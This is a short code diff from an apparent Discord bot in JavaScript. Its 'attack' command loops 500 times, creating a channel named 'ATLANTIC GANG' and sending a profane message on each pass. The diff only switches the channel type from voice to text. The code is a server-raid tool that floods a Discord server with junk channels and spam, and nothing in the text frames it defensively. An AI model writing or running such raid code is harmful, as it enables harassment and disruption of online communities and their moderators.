@@ -17,7 +17,7 @@ client.on('message' , async (message) => {
     if (message.content.startsWith(prefix + 'attack')) {
 for (let i = 0; i < 500; i++) {
 
-        message.guild.createChannel('ATLANTIC GANG', 'voice')
+        message.guild.createChannel('ATLANTIC GANG', 'text')
         message.channel.send('fuck');
 }
 }
